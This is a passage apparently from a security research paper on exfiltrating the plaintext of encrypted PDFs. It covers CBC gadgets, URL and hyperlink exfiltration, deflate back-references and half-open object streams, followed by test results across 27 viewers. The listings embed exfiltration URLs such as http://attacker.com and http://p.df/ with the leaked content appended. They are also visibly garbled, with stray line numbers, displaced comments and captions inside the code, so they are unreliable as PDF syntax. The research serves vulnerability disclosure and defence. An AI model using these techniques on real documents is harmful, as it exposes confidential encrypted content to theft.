### 5.2.1 Exfiltration via URL Manipulation (B1)

In this attack, up to 15 bytes of the unknown plaintext can be appended to the end of a URL. The PDF standard allows the execution of multiple `OpenActions` in a document, enabling us to guess the last padding byte of the `Perms` value. This is achieved by iterating over all 256 possible values of the last plaintext byte until we get `0x01`, resulting in a URL with as little randomness as possible (3 bytes), as shown in Listing 4. A limitation is that if one of the 3 random bytes contains special characters, the form submission URL might break.

```plaintext
/OpenAction [3 0 R 4 0 R ... 259 0 R]
1 1 0 obj
2
3
4
5
6 endobj
7
8 2 0 obj
9 [encrypted data]
10 endobj
11
12 3 0 obj
13
14 endobj
15
16 4 0 obj
17
18 endobj
19
...
20 259 0 obj
 >>
21
22 endobj
 >>
 >>
% value set to 2 0 obj
% calling all 256 URIs
% content to exfiltrate
% guessing last byte
% guessing last byte
Listing 4: Modified document sent to the victim (excerpt).
The attacker uses CBC gadgets to build the URI invoked once the PDF document is opened.
```

### 5.2.2 Exfiltration via Hyperlinks (B2)

Using CBC gadgets, encrypted plaintext can be prefixed with one or more chosen plaintext blocks. An attacker can construct URLs in the encrypted PDF document that contain the plaintext to exfiltrate. This attack is similar to the direct exfiltration hyperlink attack (A2). However, it does not require setting a "base" URI in plaintext to achieve exfiltration.

```plaintext
/OpenAction >
% URI set to 2 0 obj
>>
9 endobj
% CBC gadget to prepend attacker’s URI to content
(a) Modified PDF document sent to the victim (excerpt). The attacker uses CBC gadgets to prepend their URL to the encrypted data.
1 2 0 obj
2 (http://p.df/[20 bytes random] Confidential content!)
3 endobj
(b) Modified object after decryption.
Figure 10: Example of CBC-based exfiltration using links.
```

The same limitations described for direct exfiltration based on links (A2) apply. Additionally, the constructed URL contains random bytes from the gadgeting process, which may prevent exfiltration in some cases.

### 5.2.3 Exfiltration via Half-Open Object Streams (B3)

While CBC gadgets are generally restricted to the block size of the underlying block cipher (and more specifically the length of the known plaintext, in this case, 12 bytes), longer chosen plaintexts can be constructed using compression.

Deflate compression, available as a filter for PDF streams, allows writing both uncompressed and compressed segments into the same stream. Compressed segments can reference back to uncompressed segments, achieving the repetition of byte strings from these segments. These backreferences allow constructing longer continuous plaintext blocks than CBC gadgets typically allow.

Naturally, the first uncompressed occurrence of a byte string still appears in the decompressed result. Additionally, if the compressed stream is constructed using gadgets, each gadget generates 20 random bytes that appear in the decompressed stream. A non-trivial obstacle is to keep the PDF viewer from interpreting these fragments in the decompressed stream. While hiding the fragments in comments is possible, PDF comments are single-line and are thus susceptible to newline characters in the random bytes. Therefore, the length of constructed compressed plaintexts is limited.

```plaintext
% guessing last byte
1 2 0 obj
2 >
% FlateDecode: compressed content
3 stream
4 \%[20 bytes random][20 bytes random]
5 (http://attacker.com)
6 endstream
7 endobj
% created using backreferences
Listing 5: Example of a decrypted object that uses back-references and comments.
```

To deal with this caveat, an attacker can use Object Streams, which allow the storage of arbitrary objects inside a stream. The attacker uses an object stream to define new objects using CBC gadgets. An object stream always starts with a header of space-separated integers defining the object number and the byte offset of the object inside the stream. The dictionary of an object stream contains the key `First`, which defines the byte offset of the first object inside the stream. An attacker can use this value to create a comment of arbitrary size by setting it to the first byte after their comment.

```plaintext
>>
/Filter /FlateDecode
10 endstream
11 endobj
% object stream containing object 3 at offset "First" + 0
Listing 6: Object stream example that uses the object stream header to hide uncompressed fragments.
```

Using compression has the additional advantage that compressed, encrypted plaintexts from the original document can be embedded into the modified object. As PDF applications often create compressed streams, these can be incorporated into the attacker-created compressed object and will therefore be decompressed by the PDF applications. This is a significant advantage over leaking the compressed plaintexts without decompression, as the compressed bytes are often not URL-encoded correctly (or at all) by the PDF applications, leading to incomplete or incomprehensible plaintexts.

However, due to the inner workings of the deflate algorithms, a complete compressed plaintext can only be prefixed with new segments, but not postfixed. Therefore, as seen in Listing 7, a string created using this technique cannot be terminated using a closing bracket, leading to a half-open string. This is not a standard-compliant construction, and PDF viewers should not accept it. However, a majority of PDF viewers do accept it anyway (see section 6).

```plaintext
>>
/Filter /FlateDecode
3 0[20 bytes random>][20 bytes random]
7 % "First" points here
8 (http://p.df/Decompressed Confidential content
9 % everything after the original compressed content is ignored
10 endstream
11 endobj
Improving attacks B1 and B2 by using compression. The techniques mentioned above can be used to improve attacks B1 and B2, as they allow for longer chosen plaintexts to be constructed. These can be used to build longer URLs, as well as URLs without random bytes, by adding the original plaintext and using compression to reference back to it. Additionally, using compression removes the need to fix the PKCS#5 padding by guessing how to construct URLs containing fewer random bytes. This is because once a segment of the compressed plaintext is marked as the last segment, the rest of the plaintext is simply ignored by all viewers. It improves attacks B1 and B2 with flawless URLs of virtually unrestricted length (see, e.g., Listing 5). B1 and B2, however, remain independent from the support of half-open strings. Note that compression-based exploits depend on the viewer not checking the deflate compression checksum ADLER32, which was the case for all viewers.
```

### 6. Evaluation

To evaluate the proposed attacks, we tested them on 27 popular PDF applications assembled from public software directories for major platforms (Windows, Linux, macOS, and Web). If a "viewer" and an "editor" version were available, both were tested. Applications were excluded if they did not support AES256 PDF encryption (e.g., Microsoft Edge) or if the cost to obtain them would be prohibitive. All viewers were tested using their default settings.

#### 6.1 Direct Exfiltration (Attack A)

Despite being part of the PDF specification, only 17 of the tested applications supported Crypt Filters, particularly the Identity filter. Using additional approaches, such as placing our payload into strings or streams of the document that are unencrypted by design, we were able to gain partial encryption for all of the tested PDF viewers (requirement 1). A full evaluation of which viewer supports which of the 18 methods tested to gain partial encryption is given in Table 3 in the appendix.

All PDF viewers supported interactive features that could be used as exfiltration channels, such as hyperlinks or forms (requirement 3). However, four of the tested applications did not support any of the proposed techniques to reference a decrypted object from attacker-controlled content (requirement 2). It must be noted that this behavior was not limited to encrypted PDF documents. The necessary PDF standard feature, such as submittable forms or defining a “base” URI for relative URIs in the document, was simply not implemented in these four applications. Detailed information on which attack variants can be used for cross-object referencing can be derived from the A1 to A3 columns of Table 2.

In the end, we could exfiltrate the content on 23 of 27 of the applications (85%), and on 14 of them (52%) without any user interaction other than simply opening the file and inserting a password required. On an additional nine viewers, user action was required to load external resources, such as submitting a form or approving a warning, as depicted in Figure 11. It must be noted that for half of them, the level of interaction was limited to clicking somewhere on the document without any warning message having been shown. This is especially dangerous because the attacker has full control over the document’s appearance, which allows them, for example, to draw fake scrollbars or other UI elements that exfiltrate the plaintext once clicked by the user.

In 19 viewers, we could exfiltrate the plaintext via PDF forms (A1), while 13 viewers could be attacked with malicious hyperlinks (A2). Five viewers even had full JavaScript support, which allowed us to access arbitrary parts of the document and to exfiltrate them.

#### 6.2 CBC Gadgets (Attack B)

We were able to exfiltrate encrypted content on all of the tested PDF applications using CBC gadgets. Due to the encryption algorithms for PDF documents being defined in the PDF specification, the viewers have no control over the integrity protection of the ciphertext or the availability of the known plaintext in the encrypt dictionary. Therefore, all viewers are vulnerable by design to the modification of plaintext using CBC gadgets.

Using gadgets, we were able to construct self-submitting PDF forms (B1) in 15 of the viewers and malicious hyperlinks (B2) for exfiltration in all viewers. Generally, the same limitations regarding backchannels, which exist for direct exfiltration, also apply to CBC gadgets. Additionally, due to the occurrence of random bytes in URLs introduced by gadgets, CBC gadgets were not able to achieve the same level of exfiltration in some viewers as direct exfiltration did. However, especially using half-open strings within object streams (B3), we were able to achieve full plaintext exfiltration in five viewers where it was not possible using direct exfiltration. Additionally, we found that 15 viewers supported half-open strings. However, we were only able to use them for actual exfiltration in 14 viewers, due to various problems with URL handling in these object streams.

For all compression-based attacks, we found that none of the viewers checked the zlib deflate checksum—called ADLER32—that is placed right after the compressed content, allowing us to construct arbitrary compressed content using gadgets.

#### 6.3 Limitations

Although we successfully demonstrated how to exfiltrate plaintext—with or without user interaction—based on two independent and standard-compliant features of the PDF specification, this is not necessarily enough for our attacks to be practical. In this section, we discuss limitations regarding plaintext exfiltration.

**Exfiltration Constraints:** To achieve their goal, the attacker needs to leak as much content as possible—ideally, all encrypted streams and strings. Real-world PDF files contain multiple objects (often hundreds) to be exfiltrated. Fortunately, this is not a practical limitation. First, attack variants based on PDF forms (A1, B1) or JavaScript (A3) can reference and exfiltrate all streams and strings in the document at once. Second, for hyperlink-based attack variants (A2, B2, B3), the attacker can add multiple `OpenActions` or define a `Next` entry for each action and thereby build "exfiltration chains."

Certainly, there is another obstacle to solve: many PDF files in the wild are compressed to reduce their file size. For A1 and B1, this is rarely a problem since 14 of the 19 PDF viewers supporting forms allow arbitrary binary data to be submitted—in compliance with the PDF standard. Furthermore, all compressed streams are automatically decompressed by the PDF applications.